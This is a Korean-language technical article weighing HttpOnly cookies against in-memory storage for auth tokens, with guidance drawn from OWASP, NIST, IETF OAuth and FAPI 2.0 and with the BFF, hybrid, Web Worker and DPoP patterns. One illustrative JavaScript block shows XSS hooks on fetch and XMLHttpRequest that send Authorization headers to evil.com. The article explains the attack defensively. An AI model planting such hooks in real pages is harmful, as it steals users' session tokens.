"쿠키에 넣으면 DevTools에서 바로 보이는데, 메모리에 넣으면 안 보이잖아. 그러면 메모리가 더 안전한 거 아냐?"

이 질문은 프론트엔드 인증을 설계할 때 한 번쯤 떠오르는 자연스러운 의문입니다. DevTools의 Application 탭을 열면 쿠키 값이 그대로 노출되는 반면, JavaScript 변수에 담긴 토큰은 어디서도 직접 확인할 수 없습니다. 직관적으로는 "보이지 않는 게 안전하다"고 느낄 수 있습니다.

하지만 엔터프라이즈 보안의 관점은 다릅니다. OWASP, NIST, IETF OAuth Working Group, 그리고 금융권의 FAPI 2.0까지 — 주요 보안 표준들이 바라보는 관점을 정리합니다.

## "보이는 것"과 "안전한 것"은 다르다

먼저 쿠키와 메모리 저장 방식의 가시성을 비교합니다.

| 관점 | 쿠키 | 메모리 (JS 변수) |
|:--|:--|:--|
| DevTools에서 보이나 | Application 탭에서 즉시 확인 가능 | Storage 패널에 노출되지 않음 |
| JavaScript로 읽을 수 있나 | `HttpOnly` 없으면 `document.cookie`로 읽기 가능 | 같은 실행 컨텍스트의 코드가 읽기 가능 |
| 디스크에 기록되나 | 세션 쿠키도 브라우저에 따라 디스크에 기록될 수 있음 | 기록되지 않음 |
| 요청에 자동으로 붙나 | 도메인이 일치하면 **자동 전송** | 코드가 명시적으로 헤더에 첨부해야 함 |

쿠키가 "보인다"는 것은 사실입니다. 하지만 보안에서 중요한 건 **누구에게, 어떤 조건에서 보이는가**입니다.

DevTools에서 쿠키가 보이려면 **사용자 본인이 자신의 브라우저를 열어야** 합니다. 이건 위협 모델에서 "물리적 접근"에 해당하며, 이 수준의 접근이 가능한 공격자는 메모리의 토큰도 읽을 수 있습니다. Chrome의 V8 힙에서 JavaScript 문자열을 추출하는 메모리 포렌식 기법은 이미 문서화되어 있습니다 (SpecterOps, 2026년 2월).

반면 실제 웹 공격에서 중요한 건 **원격 공격자(XSS, CSRF)에 대한 방어**이고, 여기서 두 방식은 완전히 다른 보안 특성을 가집니다.

## 쿠키: CSRF에 약하고, XSS 토큰 탈취에 강하다

쿠키의 핵심 속성은 **자동 전송**입니다. 브라우저가 도메인이 일치하는 모든 요청에 쿠키를 자동으로 붙이기 때문에 CSRF(Cross-Site Request Forgery) 공격이 가능합니다.

하지만 `HttpOnly` 플래그를 설정하면 JavaScript에서 쿠키 값을 읽을 수 없습니다. XSS가 실행되어도 토큰 **값 자체**를 탈취하는 것은 불가능합니다. 공격자는 세션을 "이용"할 수는 있지만 (피해자의 브라우저에서 API를 호출), 토큰을 자신의 환경으로 가져가서 사용할 수는 없습니다.

```
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/
```

OWASP ASVS v4.0 V3.4.1은 쿠키 기반 세션 토큰에 `Secure`, `HttpOnly`, `SameSite` 속성을 **필수**로 요구합니다.

## 메모리: CSRF에 강하고, XSS 토큰 탈취에 약하다

메모리에 저장된 토큰은 `Authorization` 헤더에 명시적으로 첨부해야 하므로 CSRF가 원천적으로 불가능합니다. 브라우저가 자동으로 보내는 것이 없기 때문입니다.

하지만 XSS가 실행되면 메모리의 토큰에 직접 접근할 수 있습니다.

```javascript
// XSS 공격자가 메모리 토큰을 탈취하는 방법들

// 1. 전역 변수 읽기
const stolen = window.__accessToken;

// 2. fetch monkey-patching
const originalFetch = window.fetch;
window.fetch = function(...args) {
  const headers = args[1]?.headers;
  if (headers?.Authorization) {
    navigator.sendBeacon('https://evil.com/collect', headers.Authorization);
  }
  return originalFetch.apply(this, args);
};

// 3. XMLHttpRequest 가로채기
const origOpen = XMLHttpRequest.prototype.setRequestHeader;
XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
  if (name === 'Authorization') {
    navigator.sendBeacon('https://evil.com/collect', value);
  }
  return origOpen.apply(this, arguments);
};
```

탈취된 토큰은 공격자의 환경에서 만료될 때까지 자유롭게 사용할 수 있습니다. 피해자가 브라우저를 닫아도 공격이 **지속**됩니다. 이것이 `HttpOnly` 쿠키와의 결정적 차이입니다.

## 핵심 비교

| 공격 시나리오 | HttpOnly 쿠키 | 메모리 토큰 |
|:--|:--|:--|
| CSRF | 방어 필요 (SameSite + CSRF 토큰) | **면역** |
| XSS — 토큰 탈취 | **불가** (HttpOnly) | 탈취 가능 → 외부에서 사용 |
| XSS — 세션 이용 | 가능 (실시간, 페이지 이탈 시 종료) | 가능 (토큰 탈취 후 지속) |
| 물리적 접근/악성코드 | 디스크 쿠키 DB에서 탈취 가능 | V8 힙 메모리에서 추출 가능 |
| 탭/새로고침 | 유지됨 | **소멸** (재인증 필요) |

두 방식 모두 XSS가 뚫리면 세션을 이용당하지만, 피해의 **지속성**과 **범위**가 다릅니다.

## 엔터프라이즈는 어떻게 바라보는가

### OWASP: "localStorage에 세션 토큰을 저장하지 마라"

OWASP HTML5 Security Cheat Sheet는 명확합니다.

> "Do not store session identifiers in local storage as the data is always accessible by JavaScript. Cookies can mitigate this risk using the httpOnly flag."

JavaScript에서 접근할 수 있는 저장소(localStorage, sessionStorage, 전역 변수 포함)는 XSS에 노출됩니다. `HttpOnly` 쿠키만이 JavaScript 접근을 차단할 수 있습니다.

### NIST SP 800-63B: "안전하지 않은 위치에 놓지 마라"

NIST는 세션 바인딩에 사용되는 시크릿에 대해 다음과 같이 규정합니다.

> "Secrets used for session binding SHOULD NOT be placed in insecure locations such as HTML5 Local Storage due to the potential exposure of local storage to cross-site scripting (XSS) attacks."

또한 세션 시크릿은 애플리케이션 재시작 시 **지속되어서는 안 된다**(SHOULD NOT be persistent)고 명시합니다.

### IETF OAuth Working Group: "토큰을 브라우저에 보내지 마라"

draft-ietf-oauth-browser-based-apps-26 (2025년 12월)은 브라우저 기반 앱의 토큰 관리에 대한 가장 최신의 권위 있는 문서입니다. 핵심 권고사항의 우선순위는 명확합니다.

1. **가장 좋은 방법**: Token-mediating backend (BFF) — 토큰이 브라우저에 도달하지 않음
2. **차선**: Authorization Code + PKCE로 공개 클라이언트 운영, 짧은 수명의 토큰 + refresh token rotation
3. **피해야 함**: localStorage나 JavaScript 접근 가능한 영구 저장소에 토큰 저장

이 문서의 가장 냉정한 지적은 이것입니다.

> "Even if the application finds a storage mechanism that completely isolates stored tokens, an attacker with XSS will still be able to request a new set of tokens."

저장소를 아무리 격리해도, XSS가 뚫리면 공격자가 새 토큰을 직접 발급받을 수 있습니다. **저장 위치는 최종 방어선이 아닙니다.**

### FAPI 2.0: 금융권의 답 — "토큰 자체를 쓸모없게 만들어라"

Financial-Grade API 2.0은 금융 서비스를 위한 보안 프로파일입니다. 한국, 영국, 호주, 브라질, EU의 오픈뱅킹에서 채택하고 있습니다.

FAPI 2.0의 접근은 근본적으로 다릅니다. **Bearer 토큰을 허용하지 않습니다.** 모든 access token은 발신자 제약(sender-constraining)이 걸려야 합니다. 토큰이 탈취되어도 공격자의 환경에서는 사용할 수 없습니다.

```
FAPI 2.0 필수 요구사항:
- Sender-constrained access tokens (mTLS 또는 DPoP)
- Pushed Authorization Requests (PAR)
- PKCE with S256
- 공개 클라이언트(Public Client) 사용 금지
```

## 현대적 해결책들

### 1. BFF (Backend-for-Frontend) 패턴 — 가장 권장

```
브라우저 ←→ BFF 서버 ←→ API 서버
   │              │
   │ 세션 쿠키     │ access token
   │ (HttpOnly)   │ (서버 메모리/Redis)
```

BFF 서버가 OAuth 인증을 대행하고, 토큰을 서버 측 세션(Redis 등)에 저장합니다. 브라우저에는 암호화된 `HttpOnly` 세션 쿠키만 전달됩니다. 토큰이 브라우저에 존재하지 않으므로, **저장 위치 논쟁 자체가 사라집니다.**

IETF draft-ietf-oauth-browser-based-apps-26이 가장 강력히 권장하는 아키텍처입니다.

### 2. 하이브리드 패턴 — BFF를 쓸 수 없을 때

BFF 인프라를 구성할 수 없는 경우, 업계 합의된 차선책입니다.

- **Refresh token**: `HttpOnly`, `Secure`, `SameSite=Strict` 쿠키에 저장
- **Access token**: JavaScript 변수(메모리)에 저장, 수명 5~15분
- 페이지 새로고침 시 `/token/refresh` 엔드포인트 호출 → 새 access token 발급
- Refresh token은 사용할 때마다 rotation

```javascript
// 하이브리드 패턴의 흐름
// 1. 로그인 시
//    - 서버가 refresh token을 HttpOnly 쿠키로 설정
//    - 응답 body에 access token 반환
let accessToken = loginResponse.accessToken; // 메모리에만 존재

// 2. API 호출 시
fetch('/api/data', {
  headers: { Authorization: `Bearer ${accessToken}` }
});

// 3. 페이지 새로고침 시
//    - /token/refresh 호출 (쿠키 자동 전송)
//    - 새 access token 수신
accessToken = await refreshAccessToken();
```

이 방식의 장점은 access token이 CSRF에 면역이고(헤더로 전송), refresh token은 XSS에 강하며(`HttpOnly`), access token이 탈취되어도 짧은 수명으로 피해가 제한된다는 것입니다.

### 3. Web Worker 격리 패턴

Mercari Engineering이 문서화한 패턴으로, Auth0 SDK도 이 방식을 사용합니다.

```javascript
// main thread
const authWorker = new Worker('auth-worker.js');

// API 호출이 필요할 때 worker에 요청
authWorker.postMessage({ type: 'API_CALL', url: '/api/data' });

// worker가 토큰을 붙여서 요청하고 결과를 반환
authWorker.onmessage = (e) => {
  console.log(e.data.response);
};
```

```javascript
// auth-worker.js (별도 실행 컨텍스트)
let accessToken = null;

self.onmessage = async (e) => {
  if (e.data.type === 'API_CALL') {
    const response = await fetch(e.data.url, {
      headers: { Authorization: `Bearer ${accessToken}` }
    });
    self.postMessage({ response: await response.json() });
  }
};
```

토큰이 메인 스레드에 존재하지 않으므로 단순한 XSS로는 토큰에 접근할 수 없습니다. 하지만 XSS 공격자가 worker의 `postMessage` 인터페이스를 통해 인증된 API 호출을 실행하는 것은 여전히 가능합니다. 방어의 깊이(defense-in-depth)를 더하는 방식이지, 완전한 해결책은 아닙니다.

### 4. DPoP (Demonstration of Proof-of-Possession) — RFC 9449

토큰이 탈취되어도 쓸 수 없게 만드는 메커니즘입니다.

```
1. 클라이언트가 공개키/비밀키 쌍 생성 (Web Crypto API)
2. 토큰 요청 시 DPoP proof JWT (비밀키로 서명) 첨부
3. 인가 서버가 access token을 클라이언트의 공개키에 바인딩
4. API 호출마다 DPoP proof를 함께 전송
5. 토큰만 탈취해도 비밀키 없이는 사용 불가
```

Auth0(Early Access), Okta(프로덕션), Kong Gateway Enterprise 3.7+에서 지원합니다. FAPI 2.0에서는 mTLS와 함께 두 가지 sender-constraining 메커니즘 중 하나로 지정되어 있습니다.

다만 RFC 9449 자체가 인정하듯, 브라우저 환경에서는 XSS로 Web Crypto API의 키에 접근할 수 있어 보안이 완전하지 않습니다. DPoP는 서버 사이드(BFF) 또는 네이티브 앱에서 가장 효과적입니다.

### 5. DBSC (Device Bound Session Credentials) — 미래

Google이 개발 중인 Token Binding의 후속 기술입니다.

- TPM(하드웨어 보안 모듈)에 비밀키를 저장하여 디바이스에 세션을 바인딩
- 세션 쿠키가 만료되면 Chrome이 TPM의 비밀키로 서명하여 갱신
- 토큰이 탈취되어도 다른 디바이스에서 사용 불가
- Chrome 135에서 두 번째 origin trial 진행 중 (2025년 10월 ~ 2026년 2월)
- Windows + TPM 환경에서만 동작, 범용화까지는 시간이 필요

## 엔터프라이즈 보안 수준별 아키텍처

| 보안 수준 | 아키텍처 | 토큰 저장 위치 | 적용 분야 |
|:--|:--|:--|:--|
| 최고 | BFF + FAPI 2.0 + DPoP/mTLS | 서버만 (Redis/DB), 브라우저는 암호화된 세션 쿠키 | 금융, 의료, 정부 |
| 높음 | BFF (Token-Mediating Backend) | 서버, 브라우저는 HttpOnly 세션 쿠키 | 엔터프라이즈 SaaS |
| 중간 | 하이브리드 (refresh → HttpOnly 쿠키, access → 메모리) | refresh: 쿠키, access: JS 변수/Web Worker | 민감 데이터 다루는 SPA |
| 기본 | Public client, Authorization Code + PKCE | 메모리 + silent refresh | 저위험 SPA |
| 피해야 함 | localStorage/sessionStorage에 토큰 저장 | — | — |

## 결론

"쿠키는 보이니까 위험하고, 메모리는 안 보이니까 안전하다"는 직관은 절반만 맞습니다.

**맞는 부분**: 메모리 토큰은 DevTools Storage 패널에 노출되지 않고, 디스크에 기록되지 않으며, CSRF에 면역입니다.

**틀린 부분**: XSS 공격자에게 메모리 토큰은 완전히 노출됩니다. `HttpOnly` 쿠키는 XSS에서도 토큰 값 자체를 보호합니다. 물리적 접근이 가능한 공격자에게는 V8 힙 메모리도 읽을 수 있습니다.

엔터프라이즈 보안 표준들의 합의는 명확합니다.

1. **토큰을 브라우저에 보내지 않는 것**이 가장 좋다 (BFF 패턴)
2. 불가피하면 **HttpOnly 쿠키(refresh) + 메모리(access)** 하이브리드를 쓴다
3. 어떤 저장 방식을 선택하든 **XSS 방어가 최우선**이다 — 저장 위치는 XSS가 뚫린 후의 피해를 줄이는 2차 방어선일 뿐이다
4. 고보안 환경에서는 **토큰 자체를 쓸모없게 만든다** (DPoP, mTLS, DBSC)

"어디에 저장할까"보다 "어떻게 하면 탈취되어도 쓸 수 없게 만들까"가 엔터프라이즈가 이 문제를 바라보는 관점입니다.
